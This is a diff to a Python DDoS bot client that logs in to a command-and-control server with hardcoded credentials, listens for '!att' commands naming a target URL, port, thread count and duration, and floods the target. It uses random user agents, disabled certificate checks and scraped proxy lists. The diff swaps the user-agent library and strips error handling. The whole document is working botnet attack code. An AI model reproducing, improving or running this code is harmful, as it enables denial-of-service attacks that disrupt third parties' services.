@@ -8,6 +8,7 @@ from random import randint as ran
 from random import _urandom as byt
 from certifi import where
 from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2
+from fake_useragent import UserAgent
 from string import ascii_letters , digits
 from struct import pack
 from selenium import webdriver
@@ -26,9 +27,6 @@ from sys import modules
 from importlib.util import spec_from_file_location , module_from_spec
 from signal import SIGTERM
 from os import system , name , path , getpid , kill , getcwd
-from faker import Faker
-
-fake = Faker()  
 
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
@@ -331,40 +329,35 @@ def main():
                 sleep(5)
         try:
             while True:
-                try:
-                    data = s.recv(1024)
-                    if not data:
-                        print("Disconnected from server.")
-                        break
-                except Exception as e:
-                    print(f"Error receiving data: {e}")
+                data = s.recv(1024)
+                if not data:
+                    print("Disconnected from server.")
                     break
-                
                 if b"Username" in data:
-                    s.send(b"root")
+                    s.send("glitcham".encode())
                 elif b"Password" in data:
-                    s.send(b"itzexploit.001")
+                    s.send("FSOCIETY".encode())
                 else:
                     try:
                         c2 = data.decode().strip()
-                        parts = c2.split()
-                        if len(parts) > 6 and parts[0] == '!att':
+                        if c2.split()[0] == '!att':
                             print(c2)
-                            method = parts[1]
-                            url = parts[2]
-                            port = int(parts[3])
-                            threads = int(parts[4])
-                            rpc = int(parts[5])
-                            timme = int(parts[6])
+                            method = str(c2.split()[1])
+                            url = str(c2.split()[2])
+                            port = int(c2.split()[3])
+                            threads = int(c2.split()[4])
+                            rpc = int(c2.split()[5])
+                            timme = int(c2.split()[6])
                             timer = time() + timme
-                        elif parts[0] == '!proxy':
+                        elif c2.split()[0] == '!proxy':
                             thr(target=socks5geter).start()
-                        elif parts[0] == '!proxyir':
+                        elif c2.split()[0] == '!proxyir':
                             thr(target=iroxy).start()
-                    except Exception as e:
-                        print(f"Error processing command: {e}")
+                    except:
+                        pass
                 try:
-                    ua = fake.user_agent()
+                    us = UserAgent()
+                    ua = us.random
                     ctx = create_default_context(cafile=where())
                     ctx.check_hostname = False
                     ctx.verify_mode = CERT_NONE
@@ -959,7 +952,8 @@ def main():
                     def tcp_conn():
                         while time() < timer:
                             try:
-                                ua = fake.user_agent()
+                                us = UserAgent()
+                                ua = us.random
                                 ctx = create_default_context(cafile=where())
                                 ctx.check_hostname = False
                                 ctx.verify_mode = CERT_NONE
